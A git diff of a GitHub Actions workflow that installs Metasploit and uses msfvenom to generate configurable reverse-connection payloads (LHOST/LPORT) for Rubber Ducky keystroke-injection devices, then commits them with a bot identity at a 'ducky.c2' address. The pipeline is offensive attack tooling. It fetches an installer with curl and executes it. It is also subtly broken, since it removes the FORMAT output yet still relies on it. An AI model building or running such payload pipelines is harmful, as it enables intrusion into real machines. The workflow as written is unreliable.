@@ -22,28 +22,41 @@ jobs:
           echo "PAYLOAD=$(echo $CONFIG | jq -r .payload)" >> $GITHUB_OUTPUT
           echo "LHOST=$(echo $CONFIG | jq -r .lhost)" >> $GITHUB_OUTPUT
           echo "LPORT=$(echo $CONFIG | jq -r .lport)" >> $GITHUB_OUTPUT
-          echo "FORMAT=$(echo $CONFIG | jq -r .format)" >> $GITHUB_OUTPUT
-
-      - name: Create Output Directory
-        run: mkdir -p Rubber_Ducky/payloads
-
-      - name: Generate Payload (Docker)
+      - name: Install Metasploit (Native)
         run: |
-          echo "Pulling Metasploit Image..."
-          docker pull metasploitframework/metasploit-framework
+          echo "Downloading Metasploit installer..."
+          curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
+          chmod 755 msfinstall
           
-          echo "Running MSFVenom..."
-          docker run --rm \
-            -v "$PWD:/data" \
-            metasploitframework/metasploit-framework \
-            ./msfvenom -p ${{ steps.config.outputs.PAYLOAD }} \
-            LHOST=${{ steps.config.outputs.LHOST }} \
-            LPORT=${{ steps.config.outputs.LPORT }} \
-            -f ${{ steps.config.outputs.FORMAT }} \
-            -o /data/Rubber_Ducky/payloads/payload.${{ steps.config.outputs.FORMAT }}
+          echo "Installing..."
+          ./msfinstall
           
-          echo "Fixing permissions..."
-          sudo chown -R $USER:$USER Rubber_Ducky/payloads
+          # Verify install
+          which msfvenom
+          msfvenom --version
+
+      - name: Generate Payload
+        run: |
+          mkdir -p Rubber_Ducky/payloads
+          
+          PAYLOAD="${{ steps.config.outputs.PAYLOAD }}"
+          LHOST="${{ steps.config.outputs.LHOST }}"
+          LPORT="${{ steps.config.outputs.LPORT }}"
+          FORMAT="${{ steps.config.outputs.FORMAT }}"
+          OUTFILE="Rubber_Ducky/payloads/payload.${FORMAT}"
+          
+          echo "Generating $PAYLOAD to $OUTFILE..."
+          
+          msfvenom -p "$PAYLOAD" LHOST="$LHOST" LPORT="$LPORT" -f "$FORMAT" -o "$OUTFILE"
+          
+          # Verify generation
+          if [ -f "$OUTFILE" ]; then
+            echo "SUCCESS: Payload generated at $OUTFILE"
+            ls -l "$OUTFILE"
+          else
+            echo "ERROR: Payload file was NOT created!"
+            exit 1
+          fi
 
       - name: Commit and Push
         run: |
@@ -51,5 +64,11 @@ jobs:
           git config --global user.email 'bot@ducky.c2'
           git pull
           git add Rubber_Ducky/payloads/
-          git commit -m "Generated payload: ${{ steps.config.outputs.PAYLOAD }}"
-          git push
+          
+          # Check if there are changes to commit
+          if git diff --staged --quiet; then
+            echo "No changes to commit (File might be identical to previous version)"
+          else
+            git commit -m "Generated payload: ${{ steps.config.outputs.PAYLOAD }}"
+            git push
+          fi
